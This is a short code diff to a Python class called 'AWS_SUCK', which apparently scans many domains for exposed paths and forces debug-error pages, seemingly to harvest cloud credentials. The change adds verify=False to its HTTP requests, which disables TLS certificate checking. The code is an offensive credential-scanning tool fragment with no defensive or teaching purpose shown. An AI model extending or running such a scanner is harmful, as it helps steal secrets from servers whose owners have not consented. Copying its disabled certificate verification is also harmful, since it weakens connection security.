@@ -162,7 +162,7 @@ class AWS_SUCK:
 	def iyabukan(self, domain):
 		try:
 
-			r = requests.get(domain, headers={"user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0; Mandajanganpergi) Gecko/20190101 Firefox/77.0"}, timeout=20, allow_redirects=False)
+			r = requests.get(domain, headers={"user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0; Mandajanganpergi) Gecko/20190101 Firefox/77.0"}, timeout=20, allow_redirects=False, verify=False)
 			
 			# kalo aktif gassin lah, yakali dighosting
 			if r.status_code == 200:
@@ -182,9 +182,9 @@ class AWS_SUCK:
 		try:
 			for a in self.path:
 				url = domain+a
-				r = requests.get(url, headers={"user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0; Mandajanganpergi) Gecko/20190101 Firefox/77.0"})
+				r = requests.get(url, headers={"user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0; Mandajanganpergi) Gecko/20190101 Firefox/77.0"}, verify=False)
 				self.check(r, url)
-			rr = requests.get(url, headers={"user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0; Mandajanganpergi) Gecko/20190101 Firefox/77.0"}, data="halomin[]=asu")
+			rr = requests.get(url, headers={"user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0; Mandajanganpergi) Gecko/20190101 Firefox/77.0"}, data="halomin[]=asu", verify=False)
 			self.check(rr, url+" [DEBUG POST]")
 		except:
 			pass
